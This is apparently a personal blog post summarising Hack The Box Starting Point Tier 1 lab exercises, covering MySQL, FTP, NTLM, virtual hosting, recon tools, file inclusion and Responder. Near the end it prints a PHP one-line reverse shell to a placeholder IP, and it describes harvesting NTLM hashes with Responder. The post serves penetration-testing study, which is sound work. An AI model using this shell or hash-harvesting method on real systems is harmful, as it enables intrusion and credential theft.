---
title: 'HTB Starting Point - Tier 1'
description: 'Hack the Box Starting Point'
pubDate: 'Dec 5 2024'
heroImage: '/blog-placeholder-2.jpg'
---

Topics covered:  
* SQLi
* Server side template injection
* Remote file inclusion
* Web/reverse shells
* Navigating Jenkins
* S3

## Summary

In Tier 1, we covered even more topics. The following summary captures a bunch of the key ideas that I encountered.

### Tech Basics  
#### MySQL
* `mysql` is command line tool
* `root` is the super user
* All MySQL instances contain the databases: `information_schema`, `mysql` and `performance_schema`
* When connected to the server via the `mysql` tool, some useful commands: `USE <db>`, `SHOW TABLES;`, `SELECT * FROM <table>`


#### FTP
* Anonymous login allowed returns the code `340` 
* Anonymous login uses the username `anonymous`
* Some useful commands: `ftp <user>@<server>`, `ls`, `get <file>`


#### NTLM

This is described in more detail on the post: "[Harvesting NTLM Credentials](/blog/htb-starting-point/harvesting-ntlm-creds)"
* A set of challenge-response protocols used in Microsoft systems. 
* An NTHash is the output of the NTLM protocol's hash algorithm. This NTHash is stored on the SAM DB on a local machine, or on a domain controller.
* NetNTLMv2 is a specific string format to represent a challenge and its response. Colloquially known as a hash even though it's not


#### Name-based virtual hosting
This is a technique to allow multiple domains to be hosted on the same machine whilst still allowing each domain to handle its own requests separately. The server looks at the HTTP header `Host` to determine which service on the machine should handle the request. This host header will specify the domain name and is what makes it different to IP-based virtual hosting (which I believe is just our regular ol' DNS entries). The Host header is mandatory in HTTP/1.1. Interestingly, this has caused some complications in SSL/TLS as the handshake is done prior to the hostname being known. There is a TLS extension called "Server Name Indication" that circumvents this issue by presenting the name at the start of the handshake. Thus name-based virtual hosting can be used in both HTTP and HTTPS scenarios.

While doing the pentests below, there were times that a web server was expecting a certain DNS entry that didn't exist in my computer. To fix this, it only requires a change to the `/etc/hosts` file. e.g.

```
# /etc/hosts
10.10.10.3  my.domain.com
```

Subdomain enumeration can be completed with `gobuster vhost --apend-domain -u <domain> -w ./Discovery/DNS/subdomains-top1million-5000.txt`


### Pentest Essentials
#### Reconnaissance and enumeration
When approaching a box: 
* `nmap` everything! 
* `gobuster` is useful for site, path and virtual host enumeration
    * `dns` for subdomain enumeration
    * `dir` discovers directories/files. `-x` allows you to specify a kind of file. e.g. `gobuster dir -x php -u $TARGET -w ./Discovery/Web-Content/common.txt`
    * `vhost` for virtual hosts and virtual host subdomains
* `wappalyzer` gives an analysis of a websites tech


#### Local File Inclusion/Remote File Inclusion

* LFI is where the server is tricked into serving a local file not intended for the website. This is achievable when the site doesn't properly sanitize filepath inputs. You could try using relative or absolute paths to find a file. In one of the boxes, we were able to obtain LFI via an improper use of PHPs `include()` function
* RFI is where a server tries to connect to some remote machine to retrieve a file. Windows, by default will try and resolve UNC paths using SMB. For RFI to work in PHP, PHP must have `allow_url_include` enabled

#### Responder

A useful tool to harvest NTLM hashes. It can poison resolution protocols to trick computers into thinking the attacker's machine is the correct server. In the responder challenge, we obtained the NTLM hash by exploiting the web server's trust in our authority as an SMB server. It willingly handed over the hash!

This is described in more detail on the post: "[Harvesting NTLM Credentials](/blog/htb-starting-point/harvesting-ntlm-creds)"

#### Simple reverse shell

A simple reverse shell command in PHP

```php
<?php system("bash -i >& /dev/tcp/<IP>/1337 0>&1")?>
```

You can read more details in this blog post: "[Obtain a Reverse Shell With PHP and Bash](/blog/htb-starting-point/reverse-shell-php-and-bash/)"
